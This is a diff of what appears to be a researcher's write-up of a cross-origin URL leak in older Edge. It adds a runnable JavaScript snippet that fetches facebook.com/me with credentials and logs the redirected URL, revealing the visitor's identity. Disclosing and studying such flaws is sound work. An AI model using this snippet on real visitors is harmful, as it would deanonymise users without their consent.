@@ -28,7 +28,18 @@ Some real life examples used in the PoC are https://facebook.com/me, https://you
 
 ## Proof of Concept
 
-[Test your browser](/poc-fetch) or [see the GitHub project](https://github.com/zelivans/poc-fetch) (run poc_facebook.py for the Facebook example)
+<div class="language-klipse-eval-js" data-async-code="true">
+// Try this on a vulnerable Edge version while logged into Facebook
+// Also try with other websites you are logged in to such as the ones listed above
+fetch("https://facebook.com/me", {
+                                    mode: "no-cors",
+                                    credentials: "include",
+                                 }).then(function(response) {
+                                    console.log(response.url);
+                                 });
+</div>
+
+The full proof of concept can be found in [this page](/poc-fetch). You can also [see the GitHub project](https://github.com/zelivans/poc-fetch) (run poc_facebook.py for the Facebook example).
 
 I originally tried to find a Microsoft service that the issue applies to, so the first PoC targets [https://docs.com](https://docs.com). I later modified it a little to target Facebook. The simpler version only proves the URL leak happens with Docs, Facebook and Youtube. Anyhow, the effect is that without any user interaction or consent the user's identity is leaked to the attacker's website.
 
